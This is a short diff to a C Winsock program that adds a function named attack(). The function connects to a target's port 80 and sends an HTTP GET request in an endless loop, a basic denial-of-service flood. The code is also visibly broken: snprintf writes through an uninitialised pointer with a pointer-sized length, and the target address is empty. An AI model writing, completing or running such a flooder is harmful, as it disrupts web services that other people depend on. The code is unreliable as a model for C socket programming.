@@ -19,6 +19,21 @@ int main(){
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(80);
     const char* target_ip = "";
+
+    startWinsock(&wsaData);
+    client_socket = startSocket();
+
+    attack(&serv_addr, client_socket, target_ip);
+    return 0;
+}
+
+void attack(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* target_ip){
+    connectToServer(serv_addr, client_socket, target_ip);
+    const char* msg;
+    snprintf(msg, sizeof(msg), "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", target_ip);
+    while(1){
+        sendMsg(client_socket, msg);
+    }
 }
 
 // function to initialize Winsock so that we can use sockets
